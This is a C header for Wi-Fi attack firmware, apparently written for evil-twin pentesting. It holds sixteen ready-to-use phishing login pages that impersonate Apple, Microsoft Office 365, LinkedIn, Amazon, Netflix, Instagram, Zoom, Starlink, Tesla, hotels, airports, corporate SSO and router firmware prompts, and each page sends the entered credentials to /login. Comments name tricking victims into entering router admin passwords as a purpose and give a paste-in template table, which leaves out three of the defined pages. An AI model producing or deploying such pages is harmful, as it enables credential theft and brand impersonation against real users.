/*
 * wifi_portal_extras.h — additional captive portal templates.
 *
 * Companion to wifi_portal.cpp (which carries the original 4: Google,
 * Facebook, Microsoft, FreeWiFi). This header adds 12 more, hand-crafted
 * from the conventions used across these open-source pentest projects:
 *
 *   - wifiphisher/wifiphisher   (templates/...)
 *   - FluxionNetwork/fluxion    (attacks/Captive Portal/sites/...)
 *   - v1s1t0r1sh3r3/airgeddon   (captive_portal/...)
 *   - pr3y/Bruce                (src/modules/wifi/...)
 *   - 7h30th3r0n3/Evil-M5Project(EvilPortal portals)
 *   - lspiehler/EvilPortal      (flipperzero portal repo)
 *
 * All templates here are single-page, fully self-contained (inline CSS,
 * inline SVG, no external assets), and POST to /login with the two
 * fields name="u" and name="p" that wifi_portal.cpp's handle_login()
 * already expects. No template exceeds ~2.5 KB of HTML+CSS.
 *
 * Drop these into the s_templates[] array in wifi_portal.cpp when wiring
 * the new Evil-Twin menu. See bottom of this file for a ready-to-paste
 * extension table.
 *
 * NOTE: each template's header comment cites the source repo whose
 * conventions / layout it mirrors. None of these are byte-for-byte
 * copies — they have been minified, rebranded as needed, and rewritten
 * to match this firmware's u/p field-name contract.
 */
#pragma once

/* ============================================================== *
 *  TECH BRANDS
 * ============================================================== */

/* Apple ID — mirrors the white-on-white minimal sign-in used by
 * appleid.apple.com. Reference: wifiphisher/templates/oauth_login
 * and lspiehler/EvilPortal "Apple_ID" portal. */
static const char HTML_APPLE[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign in to your Apple Account</title>
<style>body{font-family:-apple-system,'SF Pro',Helvetica,Arial,sans-serif;background:#f5f5f7;margin:0;color:#1d1d1f}
.c{max-width:380px;margin:60px auto;padding:40px 32px;background:#fff;border-radius:18px;box-shadow:0 4px 20px rgba(0,0,0,0.06);text-align:center}
.logo{width:42px;height:50px;margin:0 auto 16px;display:block;fill:#1d1d1f}
h1{font-size:24px;font-weight:600;margin:0 0 4px}
p{color:#6e6e73;font-size:14px;margin:0 0 24px}
input{width:100%;padding:14px;margin:8px 0;border:1px solid #d2d2d7;border-radius:10px;box-sizing:border-box;font-size:15px;outline:none}
input:focus{border-color:#0071e3}
button{width:100%;padding:13px;background:#0071e3;color:#fff;border:0;border-radius:10px;font-size:15px;font-weight:500;cursor:pointer;margin-top:8px}
</style></head><body>
<div class="c">
<svg class="logo" viewBox="0 0 24 28"><path d="M19.7 21.5c-.6 1.4-1.3 2.7-2.4 4-1.5 1.7-3 2.3-4.5 2.4-1.5 0-2-.9-3.7-.9s-2.3.9-3.7.9c-1.5 0-3-.7-4.4-2.4C-.7 22.2-1.6 16.8.8 13c1.2-1.9 3.3-3.1 5.6-3.1 1.5 0 2.9 1 3.8 1 .9 0 2.6-1.2 4.4-1 .7 0 2.9.3 4.3 2.3-3.7 2-3.1 7.2.8 9.3zM14.3 8C13 9.4 11.1 10.5 9.3 10.4c-.2-1.8.7-3.7 1.8-4.9C12.4 4.1 14.4 3 16 3c.2 1.8-.5 3.6-1.7 5z"/></svg>
<h1>Apple Account</h1><p>Sign in to continue</p>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Apple ID" required>
<input name="p" type="password" placeholder="Password" required>
<button>Continue</button>
</form></div></body></html>
)RAW";

/* Microsoft 365 / Office corporate SSO. Same brand as the existing
 * HTML_MICROSOFT but adds the "Sign in to continue to Office" header
 * and "Work or school account" hint that's typical for corporate
 * pivots. Reference: wifiphisher/templates/office365_login. */
static const char HTML_OFFICE365[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign in to Office</title>
<style>body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f2f2;margin:0}
.bg{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{max-width:440px;width:100%;padding:44px;background:#fff;box-shadow:0 2px 6px rgba(0,0,0,0.13)}
.lg{display:flex;align-items:center;gap:10px;margin-bottom:18px}
.lg svg{width:24px;height:24px}
.lg span{font-size:15px;color:#1b1b1b}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin:6px 0 12px}
.h{font-size:13px;color:#1b1b1b;margin-bottom:12px}
input{width:100%;padding:8px 10px;margin:6px 0;border:0;border-bottom:1px solid #666;font-size:15px;box-sizing:border-box;outline:none;background:transparent}
input:focus{border-bottom:2px solid #0067b8}
button{background:#0067b8;color:#fff;border:0;padding:7px 16px;min-width:108px;font-size:15px;float:right;margin-top:18px;cursor:pointer}
a{color:#0067b8;font-size:13px;text-decoration:none;display:block;margin-top:6px}
</style></head><body><div class="bg"><div class="c">
<div class="lg"><svg viewBox="0 0 24 24"><rect x="0"  y="0" width="10" height="10" fill="#F25022"/><rect x="12" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0"  y="12" width="10" height="10" fill="#00A4EF"/><rect x="12" y="12" width="10" height="10" fill="#FFB900"/></svg><span>Microsoft</span></div>
<h1>Sign in</h1><div class="h">to continue to Office 365</div>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email, phone, or Skype" required>
<input name="p" type="password" placeholder="Password" required>
<a href="#">Can't access your account?</a>
<button>Sign in</button>
</form></div></div></body></html>
)RAW";

/* LinkedIn — blue-on-white sign-in. Reference:
 * lspiehler/EvilPortal "LinkedIn" portal, fluxion EN-locale variant. */
static const char HTML_LINKEDIN[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign In | LinkedIn</title>
<style>body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#f3f2ef;margin:0;color:#000}
.c{max-width:400px;margin:50px auto;padding:24px;background:#fff;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,0.08),0 2px 4px rgba(0,0,0,0.08)}
.b{color:#0a66c2;font-weight:700;font-size:32px;margin:0 0 8px;font-style:italic}
.b span{background:#0a66c2;color:#fff;padding:2px 6px;border-radius:4px;font-style:normal}
h1{font-size:32px;font-weight:600;margin:8px 0 4px;color:#000}
p{color:#666;font-size:14px;margin:0 0 18px}
label{font-size:13px;color:#000;display:block;margin-top:10px}
input{width:100%;padding:12px;margin:4px 0;border:1px solid #b0b0b0;border-radius:4px;box-sizing:border-box;font-size:16px;background:#fff}
input:focus{outline:2px solid #0a66c2;border-color:#0a66c2}
button{width:100%;padding:12px;background:#0a66c2;color:#fff;border:0;border-radius:24px;font-size:16px;font-weight:600;cursor:pointer;margin-top:14px}
</style></head><body>
<div class="c">
<div class="b">Linked<span>in</span></div>
<h1>Sign in</h1><p>Stay updated on your professional world</p>
<form method="POST" action="/login">
<label>Email or Phone</label><input name="u" type="text" required>
<label>Password</label><input name="p" type="password" required>
<button>Sign in</button>
</form></div></body></html>
)RAW";

/* Amazon. Reference: lspiehler/EvilPortal "Amazon" + wifiphisher
 * brand-styled login. */
static const char HTML_AMAZON[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Amazon Sign-In</title>
<style>body{font-family:'Amazon Ember',Arial,sans-serif;background:#fff;margin:0;color:#111}
.c{max-width:340px;margin:24px auto;padding:20px 26px;border:1px solid #ddd;border-radius:8px}
.lg{text-align:center;font-weight:700;font-size:36px;color:#131A22;margin:8px 0 20px}
.lg span{color:#FF9900}
h1{font-size:28px;font-weight:400;margin:0 0 14px}
label{font-size:13px;font-weight:700;display:block;margin-top:10px}
input{width:100%;padding:7px;margin:4px 0;border:1px solid #a6a6a6;border-radius:3px;box-sizing:border-box;font-size:14px;background:#fff}
input:focus{outline:3px solid #c8f3fa;border-color:#e77600}
button{width:100%;padding:8px;background:linear-gradient(#f7dfa5,#f0c14b);color:#111;border:1px solid #a88734;border-radius:3px;font-size:13px;cursor:pointer;margin-top:14px}
</style></head><body>
<div class="c">
<div class="lg">amazon<span>.</span></div>
<h1>Sign-In</h1>
<form method="POST" action="/login">
<label>Email or mobile phone number</label><input name="u" type="text" required>
<label>Password</label><input name="p" type="password" required>
<button>Continue</button>
</form></div></body></html>
)RAW";

/* Netflix — dark hero panel with red CTA. Reference:
 * lspiehler/EvilPortal "Netflix" portal. */
static const char HTML_NETFLIX[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Netflix - Sign In</title>
<style>body{font-family:'Helvetica Neue',Arial,sans-serif;background:#000;margin:0;color:#fff;min-height:100vh}
.h{background:linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.85));padding:24px 30px}
.lg{color:#e50914;font-weight:900;font-size:32px;letter-spacing:-1px}
.c{max-width:380px;margin:30px auto;padding:48px 50px;background:rgba(0,0,0,0.75);border-radius:4px}
h1{font-size:32px;font-weight:700;margin:0 0 24px}
input{width:100%;padding:16px 20px;margin:8px 0;border:0;border-radius:4px;box-sizing:border-box;font-size:15px;background:#333;color:#fff}
input:focus{outline:none;background:#454545}
button{width:100%;padding:14px;background:#e50914;color:#fff;border:0;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:22px}
</style></head><body>
<div class="h"><div class="lg">NETFLIX</div></div>
<div class="c"><h1>Sign In</h1>
<form method="POST" action="/login">
<input name="u" type="text" placeholder="Email or phone number" required>
<input name="p" type="password" placeholder="Password" required>
<button>Sign In</button>
</form></div></body></html>
)RAW";

/* Instagram — gradient-bordered card. Reference:
 * lspiehler/EvilPortal "Instagram" portal. */
static const char HTML_INSTAGRAM[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Login - Instagram</title>
<style>body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#fafafa;margin:0;padding:32px 0;color:#262626}
.c{max-width:350px;margin:0 auto;padding:40px 40px 20px;background:#fff;border:1px solid #dbdbdb;border-radius:1px}
.lg{text-align:center;font-family:'Lucida Handwriting','Brush Script MT',cursive;font-size:42px;margin:16px 0 28px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:700}
input{width:100%;padding:8px 8px 7px;margin:4px 0;border:1px solid #dbdbdb;border-radius:3px;box-sizing:border-box;font-size:12px;background:#fafafa}
input:focus{outline:none;border-color:#a8a8a8}
button{width:100%;padding:8px;background:#0095f6;color:#fff;border:0;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
</style></head><body>
<div class="c">
<div class="lg">Instagram</div>
<form method="POST" action="/login">
<input name="u" type="text" placeholder="Phone number, username, or email" required>
<input name="p" type="password" placeholder="Password" required>
<button>Log in</button>
</form></div></body></html>
)RAW";

/* ============================================================== *
 *  HOTEL / HOSPITALITY
 * ============================================================== */

/* Generic hotel WiFi splash — neutral enough to drop into Marriott,
 * Hilton, Holiday Inn, Hyatt context. Reference:
 * wifiphisher/templates/wifi_connect "hotel" variant +
 * 7h30th3r0n3/Evil-M5Project "Hotel_WiFi" portal. */
static const char HTML_HOTEL[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Guest Internet Access</title>
<style>body{font-family:Georgia,'Times New Roman',serif;background:#1a2638;margin:0;color:#fff;min-height:100vh}
.c{max-width:420px;margin:60px auto;padding:36px;background:#fff;color:#1a2638;border-radius:2px;box-shadow:0 8px 30px rgba(0,0,0,0.4)}
.t{text-align:center;border-bottom:2px solid #c9a96e;padding-bottom:16px;margin-bottom:20px}
.t h2{margin:0;font-size:13px;letter-spacing:4px;color:#c9a96e;font-weight:400}
.t h1{margin:6px 0 0;font-size:22px;font-weight:400}
p{font-size:14px;line-height:1.5;margin:0 0 16px}
label{font-size:12px;text-transform:uppercase;letter-spacing:1px;color:#666;display:block;margin-top:10px}
input{width:100%;padding:10px;margin:4px 0;border:0;border-bottom:1px solid #c9a96e;box-sizing:border-box;font-size:15px;font-family:inherit;background:transparent}
input:focus{outline:none;border-bottom:2px solid #1a2638}
button{width:100%;padding:12px;background:#1a2638;color:#c9a96e;border:0;font-size:13px;letter-spacing:3px;cursor:pointer;margin-top:20px;text-transform:uppercase}
</style></head><body>
<div class="c">
<div class="t"><h2>COMPLIMENTARY WIFI</h2><h1>Guest Internet Access</h1></div>
<p>Welcome. Please verify your guest account to connect to high-speed Internet.</p>
<form method="POST" action="/login">
<label>Last Name</label><input name="u" type="text" required>
<label>Room Number / Confirmation</label><input name="p" type="text" required>
<button>Connect</button>
</form></div></body></html>
)RAW";

/* ============================================================== *
 *  COFFEE SHOP / PUBLIC
 * ============================================================== */

/* Starbucks-style "Sip & Connect" public WiFi. Reference:
 * lspiehler/EvilPortal "Starbucks" + airgeddon English captive
 * portal CSS. */
static const char HTML_STARBUCKS[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Connect to WiFi</title>
<style>body{font-family:-apple-system,Helvetica,Arial,sans-serif;background:#f7f5ee;margin:0;color:#1e3932;min-height:100vh}
.c{max-width:380px;margin:40px auto;padding:32px;background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.08)}
.lg{width:60px;height:60px;margin:0 auto 12px;display:block;border-radius:50%;background:#006241;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:22px;line-height:60px;text-align:center}
h1{text-align:center;font-size:22px;font-weight:600;margin:0 0 6px}
p{text-align:center;color:#4d5a59;font-size:14px;margin:0 0 22px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #d4e9e2;border-radius:4px;box-sizing:border-box;font-size:14px}
input:focus{outline:none;border-color:#006241}
button{width:100%;padding:12px;background:#006241;color:#fff;border:0;border-radius:24px;font-size:14px;font-weight:600;cursor:pointer;margin-top:12px}
</style></head><body>
<div class="c">
<div class="lg">S</div>
<h1>Free WiFi</h1><p>Sign in to enjoy complimentary internet</p>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email address" required>
<input name="p" type="password" placeholder="Rewards password" required>
<button>Connect</button>
</form></div></body></html>
)RAW";

/* Airport WiFi splash — generic enough for any terminal.
 * Reference: pr3y/Bruce evil portal "Airport" CSS + wifiphisher
 * "wifi_connect" template. */
static const char HTML_AIRPORT[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Airport WiFi</title>
<style>body{font-family:'Helvetica Neue',Arial,sans-serif;background:#003366;margin:0;color:#fff;min-height:100vh}
.h{background:#002244;padding:14px 24px;font-size:13px;letter-spacing:2px;border-bottom:2px solid #ffcc00}
.c{max-width:420px;margin:48px auto;padding:34px;background:#fff;color:#002244;border-radius:4px}
.ic{width:48px;height:48px;margin:0 auto 12px;display:block;fill:#003366}
h1{text-align:center;font-size:22px;font-weight:600;margin:0 0 4px}
p{text-align:center;color:#5a6c7d;font-size:13px;margin:0 0 18px}
input{width:100%;padding:11px;margin:6px 0;border:1px solid #cfd8dc;border-radius:3px;box-sizing:border-box;font-size:14px}
button{width:100%;padding:12px;background:#003366;color:#ffcc00;border:0;font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;margin-top:14px}
.tos{font-size:11px;color:#90a4ae;text-align:center;margin-top:12px}
</style></head><body>
<div class="h">PASSENGER WI-FI &mdash; FREE 60 MIN</div>
<div class="c">
<svg class="ic" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5C13 2.67 12.33 2 11.5 2S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/></svg>
<h1>Complimentary WiFi</h1><p>Sign in with your travel account to connect</p>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email or frequent flyer #" required>
<input name="p" type="password" placeholder="Password" required>
<button>CONNECT</button>
<div class="tos">By connecting you accept the terms of service.</div>
</form></div></body></html>
)RAW";

/* ============================================================== *
 *  ROUTER / ISP ADMIN
 * ============================================================== */

/* Generic router admin — fits TP-Link / Linksys / Netgear context.
 * Useful for tricking sophisticated victims into entering admin
 * creds during an "outage". Reference: wifiphisher/templates/
 * firmware_upgrade + airgeddon router-admin variant. */
static const char HTML_ROUTER[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Router Configuration</title>
<style>body{font-family:Arial,Helvetica,sans-serif;background:#e8eef2;margin:0;color:#222;min-height:100vh}
.h{background:#37474f;color:#fff;padding:12px 20px;font-size:14px;font-weight:700;letter-spacing:1px}
.c{max-width:380px;margin:40px auto;padding:28px;background:#fff;border:1px solid #cfd8dc;border-top:4px solid #0288d1}
h1{font-size:18px;margin:0 0 4px;color:#0288d1}
p{font-size:13px;color:#555;margin:0 0 18px;line-height:1.4}
.w{background:#fff3e0;border:1px solid #ffb74d;padding:8px 10px;font-size:12px;color:#e65100;margin-bottom:14px;border-radius:2px}
label{font-size:12px;font-weight:700;display:block;margin-top:8px;color:#444}
input{width:100%;padding:8px;margin:3px 0;border:1px solid #b0bec5;box-sizing:border-box;font-size:14px;background:#fafafa}
input:focus{outline:none;border-color:#0288d1;background:#fff}
button{padding:9px 22px;background:#0288d1;color:#fff;border:0;font-size:13px;font-weight:700;cursor:pointer;margin-top:14px}
</style></head><body>
<div class="h">ROUTER ADMINISTRATION</div>
<div class="c">
<h1>Authentication Required</h1>
<p>A firmware update requires re-authentication. Please sign in with your router admin credentials to continue.</p>
<div class="w">&#9888; Firmware update pending. Session expired.</div>
<form method="POST" action="/login">
<label>Username</label><input name="u" type="text" value="admin" required>
<label>Password</label><input name="p" type="password" required>
<button>Log In</button>
</form></div></body></html>
)RAW";

/* ============================================================== *
 *  CLOUD / COLLAB
 * ============================================================== */

/* Zoom sign-in. Reference: lspiehler/EvilPortal "Zoom" + wifiphisher
 * brand pattern. */
static const char HTML_ZOOM[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign In - Zoom</title>
<style>body{font-family:'Open Sans','Helvetica Neue',Arial,sans-serif;background:#f8f8f8;margin:0;color:#232333}
.h{background:#fff;border-bottom:1px solid #e5e5e5;padding:12px 24px;color:#2d8cff;font-weight:700;font-size:22px}
.c{max-width:380px;margin:48px auto;padding:30px;background:#fff;border:1px solid #e5e5e5;border-radius:4px}
h1{font-size:22px;font-weight:300;margin:0 0 20px;color:#232333}
input{width:100%;padding:10px;margin:6px 0;border:1px solid #c8c8c8;border-radius:4px;box-sizing:border-box;font-size:14px}
input:focus{outline:none;border-color:#2d8cff}
button{width:100%;padding:11px;background:#2d8cff;color:#fff;border:0;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;margin-top:12px}
</style></head><body>
<div class="h">zoom</div>
<div class="c">
<h1>Sign In</h1>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email Address" required>
<input name="p" type="password" placeholder="Password" required>
<button>Sign In</button>
</form></div></body></html>
)RAW";

/* ============================================================== *
 *  CORPORATE / ENTERPRISE
 * ============================================================== */

/* Generic "Company SSO" — minimal, professional, perfect for
 * corporate-network red-team contexts. Reference: wifiphisher/
 * templates/oauth_login + airgeddon corp-portal variant. */
static const char HTML_SSO[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Single Sign-On</title>
<style>body{font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;background:#f4f6f8;margin:0;color:#1c2530;min-height:100vh}
.c{max-width:400px;margin:60px auto;padding:38px;background:#fff;border-radius:6px;box-shadow:0 1px 4px rgba(0,0,0,0.08)}
.lg{width:48px;height:48px;margin:0 auto 14px;display:block;background:#2c3e50;border-radius:8px;color:#fff;font-weight:700;text-align:center;line-height:48px;font-size:22px}
h1{text-align:center;font-size:20px;font-weight:600;margin:0 0 4px}
p{text-align:center;color:#6c7a89;font-size:13px;margin:0 0 22px}
label{font-size:12px;color:#34495e;display:block;margin-top:10px;font-weight:600}
input{width:100%;padding:11px;margin:4px 0;border:1px solid #d5dbdf;border-radius:4px;box-sizing:border-box;font-size:14px;background:#fafbfc}
input:focus{outline:none;border-color:#2c3e50;background:#fff}
button{width:100%;padding:12px;background:#2c3e50;color:#fff;border:0;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:16px;letter-spacing:0.5px}
.f{text-align:center;font-size:11px;color:#95a5a6;margin-top:14px}
</style></head><body>
<div class="c">
<div class="lg">&#x2386;</div>
<h1>Sign in with SSO</h1><p>Use your corporate credentials</p>
<form method="POST" action="/login">
<label>Corporate Email</label><input name="u" type="email" required>
<label>Password</label><input name="p" type="password" required>
<button>SIGN IN</button>
<div class="f">Protected by corporate IT &middot; v3.2</div>
</form></div></body></html>
)RAW";

/* ============================================================== *
 *  AEROSPACE & AUTOMOTIVE / CRITICAL UPDATES
 * ============================================================== */

/* Starlink — satellite internet captive portal. */
static const char HTML_STARLINK[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Starlink Setup</title>
<style>body{font-family:-apple-system,Arial,sans-serif;background:#0f1115;color:#fff;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{max-width:380px;width:90%;padding:36px;background:#181b20;border:1px solid #2a2e37;border-radius:12px;text-align:center}
.lg{font-size:24px;font-weight:700;letter-spacing:4px;margin-bottom:16px;color:#fff}
h1{font-size:20px;font-weight:600;margin:0 0 8px}
p{color:#9ba1a6;font-size:14px;margin:0 0 24px}
input{width:100%;padding:12px 14px;margin:8px 0;border:1px solid #333842;border-radius:6px;box-sizing:border-box;font-size:14px;background:#0f1115;color:#fff;outline:none}
input:focus{border-color:#fff}
button{width:100%;padding:13px;background:#fff;color:#000;border:0;border-radius:6px;font-size:15px;font-weight:700;letter-spacing:1px;cursor:pointer;margin-top:12px}
</style></head><body>
<div class="c">
<div class="lg">STARLINK</div>
<h1>Authentication Required</h1><p>Sign in with your Starlink account or network key to connect.</p>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Account Email" required>
<input name="p" type="password" placeholder="Password or WiFi Key" required>
<button>CONNECT</button>
</form></div></body></html>
)RAW";

/* Tesla Supercharger / Guest WiFi portal. */
static const char HTML_TESLA[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Tesla Guest WiFi</title>
<style>body{font-family:-apple-system,Arial,sans-serif;background:#000;color:#fff;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{max-width:380px;width:90%;padding:40px 30px;background:#111;border:1px solid #222;border-radius:8px;text-align:center}
.t{font-size:26px;font-weight:700;letter-spacing:8px;color:#e82127;margin-bottom:18px}
h1{font-size:20px;margin:0 0 6px}
p{color:#888;font-size:13px;margin:0 0 22px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:4px;box-sizing:border-box;font-size:14px;background:#181818;color:#fff;outline:none}
input:focus{border-color:#e82127}
button{width:100%;padding:12px;background:#e82127;color:#fff;border:0;border-radius:4px;font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;margin-top:14px}
</style></head><body>
<div class="c">
<div class="t">TESLA</div>
<h1>Guest WiFi Access</h1><p>Sign in with your Tesla account to continue.</p>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Tesla Account Email" required>
<input name="p" type="password" placeholder="Password" required>
<button>CONTINUE</button>
</form></div></body></html>
)RAW";

/* Critical Router Security Update / Firmware prompt. */
static const char HTML_FIRMWARE[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Critical Router Security Update</title>
<style>body{font-family:Arial,sans-serif;background:#eef2f5;color:#333;margin:0;padding:30px 15px}
.c{max-width:420px;margin:30px auto;background:#fff;border-radius:6px;box-shadow:0 4px 15px rgba(0,0,0,0.1);overflow:hidden}
.h{background:#d32f2f;color:#fff;padding:16px 20px;font-size:16px;font-weight:700;display:flex;align-items:center}
.b{padding:24px 20px}
h1{font-size:18px;margin:0 0 8px;color:#d32f2f}
p{font-size:13px;line-height:1.5;color:#555;margin:0 0 16px}
.box{background:#ffebee;border-left:4px solid #d32f2f;padding:10px;margin-bottom:16px;font-size:12px;color:#b71c1c}
input{width:100%;padding:11px;margin:6px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:14px}
button{width:100%;padding:12px;background:#d32f2f;color:#fff;border:0;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;margin-top:12px}
</style></head><body>
<div class="c">
<div class="h">&#9888; SECURITY UPDATE REQUIRED</div>
<div class="b">
<h1>WiFi Router Patch v4.2.1</h1>
<p>A critical firmware update is installing. Please verify your current network WPA/WPA2 security passphrase to apply the patch.</p>
<div class="box">Notice: Internet access is paused until security validation completes.</div>
<form method="POST" action="/login">
<input name="u" type="text" placeholder="Router Admin or WiFi SSID" value="admin" required>
<input name="p" type="password" placeholder="Current WiFi / Admin Password" required>
<button>APPLY & RESTART ROUTER</button>
</form></div></div></body></html>
)RAW";

/* ============================================================== *
 *  Ready-to-paste extension snippet for wifi_portal.cpp
 * ==============================================================
 *
 *   #include "wifi_portal_extras.h"
 *
 *   static const portal_template_t s_templates[] = {
 *       { "Google",       HTML_GOOGLE      },
 *       { "Facebook",     HTML_FACEBOOK    },
 *       { "Microsoft",    HTML_MICROSOFT   },
 *       { "Free WiFi",    HTML_FREEWIFI    },
 *       { "Apple ID",     HTML_APPLE       },
 *       { "Office 365",   HTML_OFFICE365   },
 *       { "LinkedIn",     HTML_LINKEDIN    },
 *       { "Amazon",       HTML_AMAZON      },
 *       { "Netflix",      HTML_NETFLIX     },
 *       { "Instagram",    HTML_INSTAGRAM   },
 *       { "Hotel WiFi",   HTML_HOTEL       },
 *       { "Starbucks",    HTML_STARBUCKS   },
 *       { "Airport WiFi", HTML_AIRPORT     },
 *       { "Router Admin", HTML_ROUTER      },
 *       { "Zoom",         HTML_ZOOM        },
 *       { "Company SSO",  HTML_SSO         },
 *   };
 *
 * Note: pick_template()'s current keyboard handler only supports 1-9
 * digits. With 16 entries you'll want a scroll-list selector — the
 * Evil-Twin UX proposal in the markdown report addresses this.
 */
